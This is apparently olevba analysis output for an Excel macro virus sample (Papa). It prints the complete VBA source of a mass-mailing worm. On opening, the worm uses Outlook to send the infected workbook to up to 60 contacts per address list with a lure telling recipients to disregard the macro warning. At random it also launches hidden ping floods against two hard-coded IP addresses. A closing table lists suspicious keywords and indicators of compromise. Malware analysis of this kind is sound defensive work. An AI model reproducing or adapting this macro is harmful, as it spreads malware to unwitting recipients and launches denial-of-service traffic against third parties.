olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Papa.a-6a0158cf40bd8c5ecc10dfa1d46713896924621c
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: pass.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = 0
Randomize
Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
If oa = "Outlook" Then
mn.Logon "profile", "password"
For y = 1 To mn.AddressLists.Count
x = 1
Set ab = mn.AddressLists(y)
Set papaver = oa.CreateItem(0)
For z = 1 To ab.AddressEntries.Count
vi = ab.AddressEntries(x)
papaver.Recipients.Add vi
x = x + 1
If x > 60 Then z = ab.AddressEntries.Count
Next z
papaver.Subject = "Fwd: Workbook from all.net and Fred Cohen"
papaver.Body = "Urgent info inside.  Disregard macro warning."
papaver.Attachments.Add ActiveWorkbook.FullName
papaver.Send
vi = ""
Next y
mn.Logoff
q = Int(6 * Rnd)
If q = 2 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 207.222.214.225", vbHide
ElseIf q = 4 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 24.1.84.100", vbHide
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: pass.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |207.222.214.225     |IPv4 address                                 |
|IOC       |24.1.84.100         |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

